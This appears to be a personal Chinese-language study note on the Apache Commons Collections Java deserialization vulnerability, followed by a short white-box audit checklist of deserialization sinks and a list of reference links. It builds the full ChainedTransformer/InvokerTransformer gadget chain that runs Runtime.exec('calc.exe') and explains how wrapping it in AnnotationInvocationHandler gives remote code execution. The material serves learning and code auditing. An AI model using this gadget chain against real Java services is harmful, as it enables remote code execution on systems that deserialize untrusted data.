# 反序列化漏洞 

## 漏洞概述

​	主要是org.apache.commons.collections存在潜在的远程代码执行漏洞，应用的是java的反序列化部分机制的问题。在Java反序列化中，对于传入的序列化数据没有进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。

​	TransformedMap类构造了一个如何使应用触发Transformer变换呢：我们在反序列化的时候，会调用被反序列化重写后的readObject方法。那么如果某个可序列化的类重写了readObject方法，并且对变量进行了键值修改的操作，这个Map变量是可控的就可能实现攻击。

## Transformer类

org.apache.commons.collections.Transformer类，从一个对象变为另一个对象。

这块的配置一直都没配置成功，后来发现创建的项目模板不对，应该用maven项目来创建，然后再加入依赖包就可以了，日常觉得自己菜系列。。。

```
import org.apache.commons.collections4.Transformer;

public class TranformerDemo {
    public static void main(String[] args){
        Transformer tran = new Transformer() {
            @Override
            public Object transform(Object input) {
                System.out.println( input.getClass() );  //class java.lang.Class
                return null;
            }
        };
        tran.transform( Runtime.class );
    }
}
```

​	就是调用tran.transform的时候，输出了类的类型，当我需要转变对象的时候，相应的操作应该是在transform方法中。查到有哪些类使用了transform接口，ConstantTransformer，invokerTransformer，ChainedTrandformer，TransformedMap。下边利用以上几个类构造出反序列化漏洞的payload，再看一看他们的运作原理。

## ConstantTransformer 通过转换获得内部类的对象类型

```
public class ConstantTransformer<I, O> implements Transformer<I, O>, Serializable {

    /** Returns null each time */
    public static final Transformer NULL_INSTANCE = new ConstantTransformer<Object, Object>(null);

    /** The closures to call in turn */
    private final O iConstant;

    /**
     * Transformer method that performs validation.
     *
     * @param <I>  the input type
     * @param <O>  the output type
     * @param constantToReturn  the constant object to return each time in the factory
     * @return the <code>constant</code> factory.
     */
    public static <I, O> Transformer<I, O> constantTransformer(final O constantToReturn) {
        if (constantToReturn == null) {
            return nullTransformer();
        }
        return new ConstantTransformer<I, O>(constantToReturn);
    }

    /**
     * Constructor that performs no validation.
     * Use <code>constantTransformer</code> if you want that.
     * @param constantToReturn  the constant to return each time
     */
    public ConstantTransformer(final O constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    /**
     * Transforms the input by ignoring it and returning the stored constant instead.
     * @param input  the input object which is ignored
     * @return the stored constant
     */
    public O transform(final I input) {
        return iConstant;  //重写了Transformer的transform方法
    }
```

​	方法transform返回的是 iConstant 变量， iConstant 变量必定在 ConstantTransformer(Object) 方法中被重新赋值了。

​	ConstantTransformer类通过transform方法转换得到内部类的对象类型，例如：参数为Runtime.class时，经过ConstantTransformer执行后返回 java.lang.Runtime。

```
ConstantTransformer tran = new ConstantTransformer( Runtime.class );
//通过调试可以发现，在内部完成了对Runtime的对象类型构造。
```

## InvokerTransformer 通过反射创建新的对象实例

```
public InvokerTransformer(final String methodName, final Class<?>[] paramTypes, final Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes != null ? paramTypes.clone() : null;
    iArgs = args != null ? args.clone() : null;
}

public O transform(final Object input) {//通过反射创建一个新的对象实例
    if (input == null) {
        return null;
    }
    
    final Class<?> cls = input.getClass();//获取到传进来的input对象值，就是Runtime对象
    final Method method = cls.getMethod(iMethodName, iParamTypes);//Method方法对象的名字以及函数的参数
    return (O) method.invoke(input, iArgs);//将获取的方法和参数进行执行
}
```

​	构造函数将 iMethodName 和 iParamTypes 的值传递进来，然后在 transform 方法中通过反射的方法，得到了这个方法的对象，最后返回的是Method对象。

```
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", null} );
System.out.println( tran.transform( Runtime.class ).toString() );
//输出：public static java.lang.Runtime
//第一个参数是传进来的getMethod方法，
//第二个参数是getMethod方法的参数列表（String.class, Class[].class）
//第三个参数是需要反射的方法以及其参数列表，这里就是getRuntime方法，以及参数null。
```

​	理解了一下InvokerTranformer类之后就是构造反射链的过程了。

```
//构造 Runtime.getRuntime().exec("calc.exe") 的过程
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
    String.class, Class[].class}, new Object[]{
    "getRuntime", null} );
    
//获得反射的GetRuntime()方法
Method method = (Method) tran.transform( Runtime.class );
//java.lang.Runtime.getRuntime()输出的是一个类

//invoke反射过程，将GetRuntime反射成对象，只有对象才能调用exec函数。
InvokerTransformer tran2 = new InvokerTransformer( "invoke", new Class[]{
    Object.class, Object[].class }, new Object[]{
    null, null} );
//获得Runtime的对象
Runtime run = (Runtime) tran2.transform( method );

//进行exec("calc.exe")的构造
InvokerTransformer tran3 = new InvokerTransformer( "exec", new Class[]{
    String.class}, new Object[]{
    "calc.exe"} );
tran3.transform( run );
```

## ChainedTransformer 反射链的构造

```
//就是利用了for循环，将transformers[i]运行了transform方法。
public T transform(T object) {
    for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
        object = iTransformer.transform(object);
    }
    return object;
}
```

利用ChainedTransformer类进行反射链的构造。

```
ChainedTransformer chain = null;
Transformer[] transformers = new Transformer[] { new ConstantTransformer( Runtime.class ),
    	new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},new Object[]{ "getRuntime", null} ),
        new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },new Object[]{ null, null}),
        new InvokerTransformer( "exec", new Class[]{ String.class}, new Object[] { "calc.exe" }) };

chain = new ChainedTransformer( transformers );
chain.transform( Object.class );
```

## TransformedMap

​	对Java标准数据结构Map接口的一个扩展，该类可以在一个元素被加到集合内时，自动的对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap进行实例化时作为参数传入。

​	可以通过TransformedMap.decorate()方法 ，来获得一个TransformedMap实例。

```
Map map = TransformedMap.decorate(map, keyTransformer,  valueTransformer);
```

​	当key或者value发生变化时，就会触发相应的Transfromer的transfrom()的方法。另外，可以使用之前提到的ChainedTransformer。触发时，ChainedTransformer可以按照顺序调用一系列的变换。

## AnnotationInvocationHandler

```
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```

​	这个类，满足了需要的可序列化、有memberValue为Map类型变量并可控、还有memberValue.setValue的操作。我们只需要实例化一个AnnotationInvocation类，并将其成员变量memberValue设为我们精心构造的TransformedMap对象，然后将其进行序列化，提交给应用。应用在进行反序列化的时候就可以进行远程代码执行了。






- 这类机制存在的漏洞有很多种
  - [x] 在编写程序时，如果对于继承使用不当，就可能将存在敏感信息的对象进行序列化，序列化的数据可能被劫持并泄露敏感信息。
  - [x] 在Java反序列化中，对于传入的序列化数据进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。如何使应用触发Transformer变换呢：我们在反序列化的时候，会调用被反序列化的readObject方法。那么如果某个可序列化的类重写了readObject方法，并且对变量进行了键值修改的操作，这个Map变量是可控的就可能实现攻击。

- 白盒检测

  ​	反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、DB存储等业务场景。审计时重点关注这些功能模块。

  1. 检索源码中对反序列化函数的调用来静态寻找反序列化的输入点，搜索以下函数。

     ```
     ObjectInputStream.readObject
     ObjectInputStream.readUnshared
     XMLDecoder.readObject
     Yaml.load
     XStream.fromXML
     ObjectMapper.readValue
     JSON.parseObject
     ```

  2. 确定了反序列化输入点后，考察应用的Class Path中是否包含Apache.commons.collections等危险库。

  3. 如果不包含危险库，则查看一些涉及的命令、代码执行的代码区域。

  4. 包含危险库就尝试进行复现。

  [Java反序列化漏洞-玄铁重剑之CommonsCollection(上)](https://xianzhi.aliyun.com/forum/topic/2028)
  [Java反序列化漏洞-玄铁重剑之CommonsCollection(下)](https://xianzhi.aliyun.com/forum/topic/2029?from=groupmessage)

  

  









序列化：https://blog.csdn.net/yaomingyang/article/details/79321939

反射：https://www.cnblogs.com/ysocean/p/6516248.html

反序列化漏洞：https://www.freebuf.com/news/150872.html

反序列化漏洞：https://www.jianshu.com/p/9ea143c3e7eb

反序列化漏洞：https://blog.51cto.com/13770310/2159962

深入反序列化发现与修补：https://xz.aliyun.com/t/2041

反序列化漏洞深入分析：https://security.tencent.com/index.php/blog/msg/97







